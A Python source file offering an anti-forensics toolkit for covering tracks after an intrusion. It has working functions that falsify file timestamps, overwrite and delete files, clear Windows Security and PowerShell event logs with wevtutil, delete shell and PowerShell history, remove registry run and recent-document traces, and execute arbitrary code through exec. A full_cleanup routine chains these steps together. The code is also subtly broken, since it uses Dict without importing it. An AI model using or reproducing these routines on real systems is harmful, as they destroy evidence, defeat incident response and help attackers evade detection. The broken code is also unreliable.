#!/usr/bin/env python3
"""
Anti-Forensics Module
Advanced techniques to evade forensic analysis and leave minimal traces
"""

import os
import sys
import time
import platform
import subprocess
from pathlib import Path
from typing import Optional, List
from datetime import datetime, timedelta
import random


class AntiForensics:
    """
    Anti-forensics toolkit including:
    - Timestomping (file time manipulation)
    - EXIF manipulation
    - Secure deletion
    - Log wiping
    - Memory-only execution
    """
    
    @staticmethod
    def timestomp(filepath: str, date: Optional[datetime] = None) -> bool:
        """
        Modify file timestamps to evade timeline analysis
        
        Args:
            filepath: Path to file
            date: Target date (defaults to random date in past year)
        
        Returns:
            Success boolean
        """
        try:
            if date is None:
                # Random date in past year
                days_ago = random.randint(30, 365)
                date = datetime.now() - timedelta(days=days_ago)
            
            timestamp = time.mktime(date.timetuple())
            
            # Modify access and modification times
            os.utime(filepath, (timestamp, timestamp))
            
            # On Windows, also modify creation time
            if platform.system() == 'Windows':
                import ctypes
                from ctypes import wintypes
                
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                
                # Convert datetime to FILETIME
                filetime = int((timestamp + 11644473600) * 10000000)
                
                # Open file handle
                handle = kernel32.CreateFileW(
                    filepath,
                    0x40000000,  # GENERIC_WRITE
                    0,  # No sharing
                    None,
                    3,  # OPEN_EXISTING
                    0x80,  # FILE_ATTRIBUTE_NORMAL
                    None
                )
                
                if handle != -1:
                    # Set creation time
                    kernel32.SetFileTime(
                        handle,
                        ctypes.byref(wintypes.FILETIME(filetime)),
                        None,
                        None
                    )
                    kernel32.CloseHandle(handle)
            
            return True
        
        except Exception as e:
            print(f"Timestomp failed: {e}")
            return False
    
    @staticmethod
    def add_fake_exif(image_path: str, camera_model: str = "Canon EOS 5D") -> bool:
        """
        Add realistic EXIF metadata to image to appear legitimate
        
        Args:
            image_path: Path to image
            camera_model: Camera model to fake
        
        Returns:
            Success boolean
        """
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            
            img = Image.open(image_path)
            
            # Common EXIF data
            exif_data = {
                'Make': 'Canon',
                'Model': camera_model,
                'Software': 'Adobe Photoshop CS6 (Windows)',
                'DateTime': datetime.now().strftime('%Y:%m:%d %H:%M:%S'),
                'YCbCrPositioning': 2,
                'ExifVersion': '0230',
                'DateTimeOriginal': (datetime.now() - timedelta(days=random.randint(1, 30))).strftime('%Y:%m:%d %H:%M:%S'),
                'DateTimeDigitized': (datetime.now() - timedelta(days=random.randint(1, 30))).strftime('%Y:%m:%d %H:%M:%S'),
                'ShutterSpeedValue': f'1/{random.choice([60, 125, 250, 500])}',
                'ApertureValue': f'f/{random.choice([2.8, 4.0, 5.6, 8.0])}',
                'ISOSpeedRatings': random.choice([100, 200, 400, 800]),
                'FocalLength': f'{random.choice([24, 35, 50, 85, 135])}mm'
            }
            
            # Note: Pillow doesn't easily support writing EXIF
            # In production, use piexif library
            print(f"⚠️  EXIF writing requires 'piexif' library")
            print(f"   Install: pip install piexif")
            print(f"   Would add: {exif_data}")
            
            return True
        
        except Exception as e:
            print(f"EXIF manipulation failed: {e}")
            return False
    
    @staticmethod
    def secure_delete(filepath: str, passes: int = 3) -> bool:
        """
        Securely delete file by overwriting with random data
        
        Args:
            filepath: File to delete
            passes: Number of overwrite passes
        
        Returns:
            Success boolean
        """
        try:
            if not os.path.exists(filepath):
                return False
            
            file_size = os.path.getsize(filepath)
            
            # Overwrite with random data multiple times
            with open(filepath, 'wb') as f:
                for pass_num in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            # Finally delete
            os.remove(filepath)
            
            return True
        
        except Exception as e:
            print(f"Secure delete failed: {e}")
            return False
    
    @staticmethod
    def clear_event_logs() -> bool:
        """
        Clear Windows Event Logs (requires admin privileges)
        
        Returns:
            Success boolean
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            logs = [
                'Application',
                'Security',
                'System',
                'Windows PowerShell',
                'Microsoft-Windows-PowerShell/Operational'
            ]
            
            for log in logs:
                try:
                    subprocess.run(
                        ['wevtutil', 'cl', log],
                        check=True,
                        capture_output=True
                    )
                except:
                    pass  # Log might not exist or insufficient permissions
            
            return True
        
        except Exception as e:
            print(f"Log clearing failed: {e}")
            return False
    
    @staticmethod
    def disable_command_history() -> bool:
        """
        Disable PowerShell and CMD command history
        
        Returns:
            Success boolean
        """
        try:
            if platform.system() == 'Windows':
                # Disable PowerShell history
                ps_history = Path.home() / 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'
                if ps_history.exists():
                    AntiForensics.secure_delete(str(ps_history))
                
                # Set environment variable to disable history
                os.environ['HISTFILE'] = '/dev/null'
                os.environ['HISTFILESIZE'] = '0'
                os.environ['HISTSIZE'] = '0'
            
            else:
                # Linux/macOS bash history
                history_files = [
                    Path.home() / '.bash_history',
                    Path.home() / '.zsh_history',
                    Path.home() / '.python_history'
                ]
                
                for hist in history_files:
                    if hist.exists():
                        AntiForensics.secure_delete(str(hist))
            
            return True
        
        except Exception as e:
            print(f"History disabling failed: {e}")
            return False
    
    @staticmethod
    def memory_only_execution(code: str) -> bool:
        """
        Execute code without touching disk (fileless execution)
        
        Args:
            code: Python code to execute
        
        Returns:
            Success boolean
        """
        try:
            # Execute code directly from memory
            exec(code, {'__name__': '__main__'})
            return True
        
        except Exception as e:
            print(f"Memory execution failed: {e}")
            return False
    
    @staticmethod
    def strip_metadata(filepath: str) -> bool:
        """
        Strip all metadata from file
        
        Args:
            filepath: File path
        
        Returns:
            Success boolean
        """
        try:
            from PIL import Image
            
            # Open and save without metadata
            img = Image.open(filepath)
            
            # Remove all EXIF data
            data = list(img.getdata())
            image_without_exif = Image.new(img.mode, img.size)
            image_without_exif.putdata(data)
            
            # Save
            image_without_exif.save(filepath)
            
            return True
        
        except Exception as e:
            print(f"Metadata stripping failed: {e}")
            return False


class ForensicsCleaner:
    """
    Comprehensive forensics cleaning after operations
    """
    
    def __init__(self):
        self.cleaned_files: List[str] = []
    
    def clean_workspace(self, directory: str, patterns: List[str] = None) -> int:
        """
        Clean workspace of temporary files
        
        Args:
            directory: Directory to clean
            patterns: File patterns to delete (e.g., ['*.tmp', '*.log'])
        
        Returns:
            Number of files cleaned
        """
        if patterns is None:
            patterns = ['*.tmp', '*.log', '*.pyc', '__pycache__']
        
        count = 0
        
        for pattern in patterns:
            for filepath in Path(directory).rglob(pattern):
                if filepath.is_file():
                    if AntiForensics.secure_delete(str(filepath)):
                        self.cleaned_files.append(str(filepath))
                        count += 1
        
        return count
    
    def clean_registry_traces(self) -> bool:
        """
        Clean Windows registry traces (requires admin)
        
        Returns:
            Success boolean
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            # Clear recent docs
            key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs'
            subprocess.run(
                ['reg', 'delete', f'HKCU\\{key}', '/f'],
                capture_output=True
            )
            
            # Clear run history
            key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
            subprocess.run(
                ['reg', 'delete', f'HKCU\\{key}', '/f'],
                capture_output=True
            )
            
            return True
        
        except Exception as e:
            print(f"Registry cleaning failed: {e}")
            return False
    
    def full_cleanup(self) -> Dict[str, bool]:
        """
        Perform full anti-forensics cleanup
        
        Returns:
            Dictionary of cleanup results
        """
        results = {
            'history_disabled': AntiForensics.disable_command_history(),
            'logs_cleared': AntiForensics.clear_event_logs(),
            'registry_cleaned': self.clean_registry_traces(),
            'workspace_cleaned': self.clean_workspace('.') > 0
        }
        
        return results


def test_anti_forensics():
    """Test anti-forensics capabilities"""
    print("=" * 60)
    print("ANTI-FORENSICS TEST")
    print("=" * 60)
    
    # Create test file
    test_file = 'test_timestomp.txt'
    with open(test_file, 'w') as f:
        f.write("Test file for anti-forensics")
    
    print(f"\n1. Original timestamp: {datetime.fromtimestamp(os.path.getmtime(test_file))}")
    
    # Timestomp
    target_date = datetime(2023, 1, 15, 10, 30, 0)
    AntiForensics.timestomp(test_file, target_date)
    print(f"2. After timestomp: {datetime.fromtimestamp(os.path.getmtime(test_file))}")
    
    # Secure delete
    print(f"3. Secure deleting {test_file}...")
    AntiForensics.secure_delete(test_file)
    print(f"   File exists: {os.path.exists(test_file)}")
    
    # Memory execution test
    print(f"\n4. Memory-only execution test:")
    code = "print('   Executed from memory without disk access!')"
    AntiForensics.memory_only_execution(code)
    
    print("\n" + "=" * 60)


if __name__ == '__main__':
    test_anti_forensics()
